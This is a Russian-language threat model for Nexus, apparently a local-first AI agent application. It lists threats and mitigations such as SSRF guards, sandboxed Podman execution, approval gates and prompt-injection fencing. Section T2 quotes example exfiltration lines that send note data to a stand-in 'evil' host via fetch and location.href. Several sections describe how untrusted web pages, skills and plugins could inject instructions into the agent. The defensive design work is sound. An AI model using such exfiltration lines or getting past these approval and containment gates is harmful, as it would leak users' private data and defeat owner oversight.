# Nexus — Threat Model

> Статус: v0.2 (2026-06-23). Оператор-facing модель угроз. Чётко разделяет **РЕАЛИЗОВАНО** (в коде сегодня), **default-OFF/owner-gated** (построено, но выключено до явного включения владельцем) и **🔭 live-валидация pending** (код есть, не прогнан на боевом железе). Обновлено после эпиков sandbox-exec, субагентов, deep-research, self-learning, backup/restore.

## 1. Допущения и границы доверия
- **Local-first, single-owner.** Один оператор владеет устройством и vault.
- **Vault = доверенный источник** (созданный/курируемый оператором). Содержимое заметок — данные, не код.
- **Plugins / skills (тело) / web / tool-output / импортируемый бэкап = НЕдоверенный вход.** Обрабатываются как данные (анти-инъекция, фенсинг, гейты).
- **Оператор доверяет своей LLM** для in-process-операций (vault-actuator). kill-switch + risk-tiers + approval + audit смягчают КООПЕРАТИВНЫЕ ошибки модели. Против адверсарной/джейлбрейкнутой LLM реальная изоляция — **OS-граница песочницы** (rootless Podman, T7), а не in-process-эвристики.
- **TCB (доверенная база):** ядро (`nexus-core`), хост-OS, локальный LLM-сервер, хостовая сторона host/exec-сервера. Approval-гейт, redaction, fencing внутри процесса — accident-prevention, НЕ containment; containment против exec даёт контейнер.
- **Default-OFF посыл.** Все «опасные» способности (host-actuator, делегирование, deep-research, self-learning) выключены из коробки и включаются ТОЛЬКО явным флагом владельца. Из коробки агент — vault-only с approval-гейтом.
- **Autonomy-дефолт безопасен.** `ai.agent_autonomy` при `null`/невалидном значении → рантайм-`"confirm"` (человек-в-петле); Confirm-тир НИКОГДА не авто-применяется без явного `"auto"`-opt-in. Безголовый agentd без аппрувера = `PolicyDefault` auto-DENY всего Confirm-тира.

## 2. Сценарии угроз × митигации

Легенда: ✅ реализовано · 🔒 построено, default-OFF/owner-gated · 🔭 код есть, live-валидация pending · ⚠ остаточный риск.

### T1 — Confused-deputy через плагин/скилл (расширение крадёт права)
- ✅ Capability-broker: идентичность по токену, не по запросу; scoped-проверка fail-closed (`plugin/broker.rs`, `plugin/permission.rs`). Skills: `granted = declared ∩ policy`, forced base `{VaultRead, VaultWrite}`; опасные капы (Shell/WebFetch/WebPost/HostProcess) **НЕ грантятся** в текущей фазе — declared advisory, не grant (`skills/capability.rs`).
- ✅ Path-scope + symlink-guards (`resolve_vault_path`, `resolve_plugin_dir` — canonicalize + containment).
- ✅ Скилл НЕ может сам объявить капабилити: `skill.save` пишет во frontmatter только `name`/`description` (агент не выражает `capabilities`); тело SKILL.md — проза, структурно инертная (см. T11).
- ⚠ Plugin-audit пока in-memory (`plugin/broker.rs AuditLog` — `Vec<AuditEntry>`, теряется при дропе брокера) → durable-хранилище ОБЯЗАТЕЛЬНО перед включением недоверенной плагин-экосистемы (сейчас плагины in-process/оператор-курируемые).

### T2 — SSRF / DNS-rebind (эгресс на внутренние сервисы / metadata)
- ✅ Единственный outlet `net::GuardedClient`; `net/resolve.rs check_resolved_ips`: metadata (169.254.169.254 / IMDS-v6) + link-local (169.254/16, fe80::/10) блок **ВСЕГДА**; private/loopback/ULA/CGNAT блок при `deny_private` (web/agent/research-классы). LAN-LLM (chat/embed) жив при `deny_private=false`.
- ✅ Веб-инструменты агента, deep-research-воркеры и sandbox-эгресс ходят наружу ТОЛЬКО через `GuardedClient` (research — через `GuardedResearchWeb`, песочница — через AF_UNIX→`GuardedProxy`; см. T7/T10), наследуя allowlist/SSRF/аудит.
- ✅ **Плагинный iframe — контейнмент FETCH-КЛАССА egress через собственную CSP** (`plugin-host.ts withPluginCsp`/`PLUGIN_CSP`): sandbox-iframe (`allow-scripts`, opaque origin) закрывает DOM/storage/родителя, но НЕ сетевой выход — плагин, прочитав заметку через брокер, мог бы `fetch('https://evil',{body:текст})`/`img.src`/`sendBeacon` ПРЯМО из iframe, минуя brokerный net-allowlist/SSRF-гард. **fetch-класс закрыт** вставкой ЖЁСТКОЙ CSP первым `<meta http-equiv>` в `<head>` srcdoc: `connect-src/img-src/media-src/font-src/form-action/frame-src 'none'` (+ `default-src 'none'`, `base-uri 'none'`) глушат fetch/XHR/beacon/img-пиксель/`<form>`; `script-src/style-src 'unsafe-inline'` держат UI-JS живым, а `postMessage` не подпадает под `connect-src` → для fetch-класса единственный outlet плагина — GuardedClient-путь брокера (`net.fetch`). Единая точка вставки (`withPluginCsp`) — любой будущий загружаемый srcdoc (PLUG-2) наследует контейнмент. (App-CSP на srcdoc в этом WebView не энфорсится — отсюда собственная meta-CSP.)
- ⚠ **ОСТАЁТСЯ navigation-egress (known-gap до PLUG-2).** `connect-src` НЕ ловит `location.href='https://evil?d='+btoa(данные)` — это НАВИГАЦИЯ, полноценная эксфильтрация в query мимо fetch-класса и мимо `sandbox=allow-scripts` (тот блокирует лишь parent/top-навигацию, не self-навигацию iframe). Добавлен `navigate-to 'none'` как ПЕРВЫЙ слой, но его поддержка в WKWebView **непоследовательна** → это defence-in-depth, НЕ гарантия. Полное закрытие требует **Tauri sub-frame navigation-handler** (перехват навигации суб-фрейма плагина на хосте) — ОБЯЗАТЕЛЕН до исполнения untrusted-кода в PLUG-2 (BACKLOG). Также known-gap: WebRTC/STUN-утечка на EOL-macOS 10.15 (Safari<15.4 не кладёт `RTCPeerConnection` под `connect-src`).
- ⚠ Chat-путь допускает LAN: при злонамеренной конфигурации LAN (rogue SLAAC/DHCP-metadata-сосед) chat мог бы достучаться. Митигация: оператор контролирует LAN; metadata всё равно заблокирован всегда.

### T3 — Утечка секретов (в логи / эгресс / аудит)
- ✅ `Redacted<T>` + crash-scrub; content-free durable-аудит (`DiffSummary` без текстового поля by-construction, AGENT-6); egress-аудит не пишет тело; exec-ledger хранит `exit + байт-счётчики`, НЕ stdout/stderr (`sandbox/exec_host.rs`).
- ✅ **Env-scrub для exec РЕАЛИЗОВАН** (SANDBOX-6a): окружение строится «снизу вверх» из пустого набора — `build_exec_env` НИКОГДА не читает `std::env`, выдаёт только `PATH`/`LANG`/`HOME`(→scratch tmpfs) + валидированный allow-list; reserved-ключи неперезаписываемы; контейнерный `--env` рендерится только из явного `env_allowlist` (по умолчанию пуст) (`sandbox/exec_host.rs build_exec_env`, `sandbox/mod.rs`). Это закрывает прежний пробел «env-scrub не реализован».
- ⚠ Будущий `env_passthrough` из метаданных скилла пока пуст by-construction; при его появлении нужен veto опасных динамлинкер-имён (LD_PRELOAD/LD_LIBRARY_PATH/LD_AUDIT/IFS/BASH_ENV) на capability-уровне.

### T4 — Потеря данных (актуатор перезаписал/удалил)
- ✅ Актуатор `classify` — ИСЧЕРПЫВАЮЩИЙ match по `ActionTarget` без catch-all (compile-time fail-closed). RiskTier Auto/Confirm/HardBlock. Write-before-act durable intent (миграция 020) + snapshot-before-act + **обратимый undo** (AGENT-4). Удаление — в корзину (`move_to_trash`), не hard-rm.
- ✅ Актуатор **default-OFF** (`ai.agent_actuator_enabled=false`) → из коробки stubs.
- ✅ Все новые write-пути (отчёт deep-research, `skill.save`) идут через ТОТ ЖЕ гейт (classify→autonomy→snapshot→atomic→undo), не мимо (`agent/research/write.rs`, `actuator/apply.rs apply_skill_save`).

### T5 — Sync / git-injection (multi-device vault)
- ✅ git-sync отдельный канал, оператор контролирует креды (keychain); агент НЕ вызывает git-sync, sync НЕ исполняет через актуатор. Конфликт-резолвер (3-way).
- 🔭 Agent-triggered sync — если появится, за capability-гейтом.

### T6 — Prompt-injection → актуатор (вредная инструкция в данных провоцирует запись)
- ✅ Недоверенный контент (web/skills/память/vault-fetch/web-страницы research) обёрнут в user-role + **per-request `injection_marker()`** (непредсказуемый hex — контент, заготовленный заранее, не может закрыть фенс) + system-префикс «данные, не инструкции» (`fence_observation`, `ai/chat.rs`). Defense-in-depth ВТОРИЧНА к approval-гейту.
- ✅ Любое Confirm-действие требует human-approval (агрегированный diff) перед apply; headless = PolicyDefault auto-DENY. Канал решений fail-closed: закрытие/битый формат approval-канала → `reject_all` (`actuator/decision.rs ChannelDecision`), а не тихий пропуск.
- ⚠ Маркер-фенсинг — accident-prevention, НЕ защита от джейлбрейка. Реальная защита = approval + kill-switch + (для exec) OS-изоляция (T7).

### T7 — Agent-shell / process / host-execution — 🔒 ПОСТРОЕНО (default-OFF), 🔭 live-валидация .28 pending
Раньше этого не существовало; теперь shell/process/git исполняются **внутри хардненного контейнера** под хостовым гейтом. Из коробки выключено: `ai.sandbox_enabled=false` (мастер-свитч) и `ai.shell_enable=false` (owner-gated) → exec-таргеты HardBlocked (`BlockReason::ShellDisabled`/`SandboxUnavailable`).
- 🔒 **OS-изоляция**: rootless Podman `--network=none` (сеть только через AF_UNIX→`GuardedProxy`), `--read-only` rootfs, `--tmpfs /tmp` (scratch), vault bind `:ro` (kernel EROFS на запись), `--cap-drop=ALL`, `--security-opt=no-new-privileges`, `--userns=keep-id`, cgroups (pids/mem/cpus). (`sandbox/mod.rs`, `sandbox/runner.rs`).
- 🔒 **3 AF_UNIX-сокета** (egress/act/event), 0600, peer-gated `SO_PEERCRED` по uid (host-uid из владельца socket-dir); per-run, вне vault-mount (`sandbox/runner.rs`).
- 🔒 **Хостовой гейт decide→approve→execute→report** с ledger-FSM на CAS (PROPOSED→APPROVED→EXECUTING→EXECUTED|FAILED), **one-shot exec-token** (Blake3 от run_id|action_id|fingerprint|nonce, гасится один раз), **host-authority argv** (argv берётся из сохранённого `Action`, не из повторной заявки контейнера — закрыт TOCTOU approve-ls-run-rm), last-moment kill-switch (re-check паузы перед записью EXECUTING, токен возвращается в pending) (`sandbox/exec_host.rs`).
- 🔒 **Exec-таргеты НИКОГДА не Auto**: `ExecDecision` структурно без Auto-варианта (только Confirm/Rejected/HardBlocked); vault-таргеты на host/exec fail-closed отвергаются (`TryFrom<Action>`). Soft-cap `MAX_PENDING_EXEC=64`. Реальный `process::Command` живёт ТОЛЬКО внутри контейнера (`exec_child.rs`); хост спавнит лишь сам podman (egress-lint).
- 🔒 **GitOp обратим**: pre-op git-ref снимается в контейнере, валидируется хостом (`is_git_sha`, ≤64 hex) и пишется в ledger только если eligible; shell/process — необратимы by-design (`undo→None`).
- ✅ **Live-валидация Tier-2 containment** прогнана на боевом Podman .28 (containment-матрица + `--sandbox-run`/`--sandbox-undo`; Tier-2 тесты `#[ignore]` по умолчанию, требуют `NEXUS_SANDBOX_IT=1`). 🔭 ОСТАЁТСЯ перед включением: прод-проводка коннектора (`ai.sandbox_enabled→SandboxRunner`) и live-exec-цикл реальной модели на боевом железе (см. §4).
- ⚠ Остаточно: kernel 0-day (любой слой containment пробивается дырой в ядре хоста → митигация: патчи/в будущем microVM); fork-held-pipe → exec до wall-clock-таймаута; timing/output side-channels (cap 65KB ring-buffer); зависимость от rootless-Podman ≥4.x (SO_PEERCRED/keep-id).

### T8 — Connector remote-auth (app↔agentd)
- ✅ In-process / loopback. 🔒 **AF_UNIX-сокет** `~/.nexus/agentd.sock` (mode 0600 — OS-изоляция юзеров) + `SO_PEERCRED` peer-gate. 🔭 Remote (WS): TLS обязателен + token (bearer, per-session scope, keychain/env), opt-in. Detail: `docs/specs/agent-connect.md`.

### T9 — Субагент/делегирование: эскалация привилегий ребёнком — 🔒 ПОСТРОЕНО (default-OFF)
`ai.delegation.enabled=false` по умолчанию (консервативные капы depth=1/fanout=3/spawns=8).
- 🔒 **Toolset ребёнка ⊆ родителя** (set-intersection в `build_child_registry`); супермножество/неизвестные имена молча отбрасываются, не добавляются.
- 🔒 **CHILD_BLOCKED_TOOLS = {delegate.run, research.run, skill.save}** удалены из детского реестра by-construction → нет рекурсивного делегирования и авторства скиллов ребёнком (`delegate/registry.rs`; `skill.save` регается только для top-level).
- 🔒 **Изоляция контекста**: ребёнок стартует с `memory=None` (нет recall фактов/истории родителя); фокус-промпт без истории родителя (`delegate/child_task.rs`).
- 🔒 **Подавление анонимных событий**: `SubagentForwarder` глушит токены/tool-call/final ребёнка (родитель видит только id-несущие Proposal/Diff/Plan/SubagentStatus) — нет утечки/мисатрибуции (`delegate/spawn.rs`).
- 🔒 **Общий kill-switch/бюджет**: `Arc<AtomicBool> paused` + общий пул spawns (`Arc<AtomicUsize>`) + общий deadline (`Instant`) — дети не размножают бюджет и не переживают родителя; `check_then_acquire_spawn` fail-closed (CAS без underflow). depth убывает монотонно (на max_depth=1 ребёнок не спавнит).
- 🔒 **Lineage + recovery**: `parent_run_id` (миграция 024); `reconcile_orphan_child_runs` на старте agentd добивает зависших детей; JoinSet-изоляция (упавший ребёнок не валит батч).
- ⚠ Остаточно: JoinSet abort-on-drop при отмене родителя полагается на стартовый reconcile-sweep (TTL); при общем dispatcher дети конкурируют за один blast-radius/ledger (политика/autonomy, не privilege-изоляция).

### T10 — Deep-research: инъекция через недоверенный веб — 🔒 ПОСТРОЕНО (default-OFF)
`ai.research.enabled=false` + требует ещё delegation + web + dispatcher (4 конъюнктивных гейта; compile-time все `Some`).
- 🔒 **Воркеры read-only by-construction**: `ResearchWeb` = ровно {search, fetch}, без `ActionDispatcher` → произвольная запись структурно невозможна (`agent/research/worker.rs`).
- 🔒 **Фенсинг недоверенного веба**: страница (title+url+body одним блоком) обёрнута per-run `injection_marker` + `fence_observation` ДО extract-промпта; находки воркеров пере-фенсятся ПЕРЕД ре-инъекцией в synthesize/final (`orchestrate.rs`).
- 🔒 **Запись отчёта ТОЛЬКО через actuator-гейт** (`Action::note_create`→classify→autonomy→audit→atomic), никогда raw fs; frontmatter через `safe_value` (анти-YAML-инъекция).
- 🔒 **Ограничители**: `StopReason` (6 явных путей выхода), wall-clock deadline (проверка перед каждым дорогим LLM-вызовом), round-cap (`HARD_MAX_ROUNDS=8`), url-dedup (2 слоя), content-cap (15k, UTF-8-safe), bounded concurrency; stop-парсер fail-closed (только `YES` на границе слова).
- ⚠ Остаточно: джейлбрейк модели вне фенса возможен (фенс — defense-in-depth); homoglyph/SSRF-варианты URL могут проскочить dedup (ловятся на egress-слое `GuardedClient`).

### T11 — Self-learning: отравление скиллов (агент пишет себе SKILL.md) — 🔒 ПОСТРОЕНО (default-OFF)
`ai.skills.learning_enabled=false` (owner-gated).
- 🔒 **`skill.save` ТОЛЬКО через actuator-гейт** (`ActionTarget::SkillSave`): НИКОГДА не Auto — `classify_skill_save` не возвращает Auto, а `dispatch_skill_save` ещё и fail-closed отвергает (`Err`) если тир оказался Auto (двойной барьер); skills_root-confined (lexical+canonical, reject `..`/abs/symlink/`vendor/`); форма строго `<name>/SKILL.md` (`actuator/apply.rs`, `actuator/orchestrate.rs`).
- 🔒 **Обратимость**: parse round-trip ДО любой записи (битый frontmatter → нет касания диска); create→Trash, overwrite→Snapshot-before-write (если snapshot не удался — `Failed` без записи).
- 🔒 **Потолок капабилити**: инструмент пишет лишь `name`/`description`; агент НЕ может объявить `capabilities` (см. T1). Провенанс `created_by='agent'` — `mark_agent_created` INSERT-only (нет промоушена vendor/user-телеметрии).
- 🔒 **Curator НИКОГДА не удаляет**: lifecycle active→stale→archive (обратимо), ТОЛЬКО `created_by='agent'`, не трогает vendor/user/pinned; GC orphan-телеметрии лишь на ЧИСТОМ каталоге (`errors()==[]`, «сомневаешься — не разрушай»). Vendor-скиллы hash-pinned (sha256 vs `vendor.lock`).
- ⚠ Остаточно: агент-автор может «заявить» капы в ПРОЗЕ тела SKILL.md (модель прочтёт как текст, но структурно инертно — это введение в заблуждение, не эскалация); окно GC-margin при частичных парс-ошибках (накопление stale-строк, безопасно).

### T12 — Backup/restore: импорт сфабрикованного бэкапа — ✅ реализовано
Импорт — **по инициативе пользователя** на выбранном им файле (контракт «свой бэкап своих данных»).
- ✅ **Гейты ДО записи**: магический `format="nexus-backup-v1"`; hard-stop `ImportError::SchemaTooNew` если бэкап новее текущей схемы (новый формат мог нести неизвестные колонки/NOT NULL → тихая потеря/краш); anti-DoS `MAX_BACKUP_BYTES=512МиБ` (до `serde_json`) + `MAX_IMPORT_ROWS=5M` (до транзакции) (`backup/mod.rs`, `commands/backup.rs`).
- ✅ **Без SQLi**: все значения через `params!`; **атомарность** (одна транзакция, rollback при ошибке); `INSERT OR IGNORE`/pre-check не перетирают существующие строки; ремап session-id хранит ссылочную целостность (осиротевшие сообщения/эпизоды отбрасываются, без каскада).
- ✅ **Гейт провенанса скиллов**: импорт повторно проверяет `created_by='agent'` (defense-in-depth поверх фильтра экспорта).
- ⚠ Остаточно: сфабрикованный вручную бэкап может выставить `created_by='agent'` на строку телеметрии — но импорт пишет ТОЛЬКО таблицу `agent_skill_usage` (счётчики/state), НЕ создаёт исполняемый SKILL.md (тот живёт на диске, не в бэкапе); orphan-строка под несуществующий скилл подчищается curator'ом `forget_orphans`. Блумаст: телеметрия, не код. Нет per-field size-cap (агрегатный rows-cap есть) и нет подписи/HMAC (защита от рассинхрона, не от подделки) — приемлемо для user-initiated импорта своего файла.

### T13 — Доступность: watcher/indexer feedback-loop (структура vault) — ✅ базовая защита
В модели vault доверенный (§1), поэтому это availability/robustness, не адверсарная угроза.
- ✅ Watcher игнор-лист фильтрует `.nexus`/`.db*`/`.git`/dotfiles и схлопывает remove→create (AC-Б9), не давая записям БД триггерить рекурсивную переиндексацию (`watcher/mod.rs`).
- ⚠ Остаточно: symlink-петли или очень большой файл в vault могут раздуть CPU/память индексатора; ignore-логика покрыта юнит-тестами, не chaos-тестом. Будущее: bounded-concurrency индексатора + per-file size-cap.

### T4-доп — Latency/таймаут approval (консистентность)
- ✅ write-before-act (durable intent ДО apply, миграция 020) гарантирует: медленный/таймнутый approval → Confirm-батч auto-reject (безопасно), без полузаписи; зависшие `proposed`-строки без `outcome` подметаются reconcile-sweep на рестарте.

## 3. Известные пробелы (осознанные)
- In-process эвристики (approval/redaction/fencing) НЕ являются containment против adversarial-LLM для in-process vault-операций — реальная изоляция есть только для **exec** (контейнер, T7). Будущее ужесточение: microVM (Firecracker/gVisor) вместо rootless-Podman.
- Plugin-audit + pending-proposals не durable (пререквизит широкого использования плагинов).
- `env_passthrough` из скиллов пока пуст; при включении нужен veto опасных динамлинкер-имён (T3).
- Sandbox-exec: containment Tier-2 валидирован на боевом Podman; ждёт прод-проводки коннектора + live-exec-цикла (T7, §4).
- Backup-импорт доверяет `created_by` из файла (телеметрия-only, blast-radius ограничен; T12); подпись бэкапа — на будущее.
- Redaction (`Redacted<T>`) применяется ВЫБОРОЧНО: ядро проверено как НЕ логирующее контент заметок, но это страховка-от-регрессий, не compile-time-инвариант — будущие web/import-фичи, логирующие пользовательский текст, ОБЯЗАНЫ оборачивать чувствительные поля.
- Доступность индексатора (T13): watcher-ignore-list тестирован юнитами (AC-Б9), не chaos-тестом; кооперативно-безопасно (vault доверенный), но не закалено против symlink-петель/гигантских файлов.

## 4. Фаза-гейты (security)
- **Сейчас (из коробки)**: vault-only актуатор default-OFF, kill-switch, approval, audit, фенсинг. Опасные способности (host-exec/делегирование/research/self-learning) **выключены**. Допущение: оператор доверяет LLM для vault-операций.
- **Включение делегирования / deep-research / self-learning** (`ai.delegation.enabled` / `ai.research.enabled` / `ai.skills.learning_enabled`): построены default-OFF/fail-closed; гейт = явный owner-флип после ознакомления с T9/T10/T11.
- **Включение host-actuator (exec)**: код построен (T7), но гейт = (1) ЭТОТ THREAT_MODEL принят оператором + (2) live-валидация containment на боевом Podman + (3) прод-проводка `ai.sandbox_enabled→SandboxRunner` + (4) явные `ai.sandbox_enabled`/`ai.shell_enable`. Из коробки exec HardBlocked.
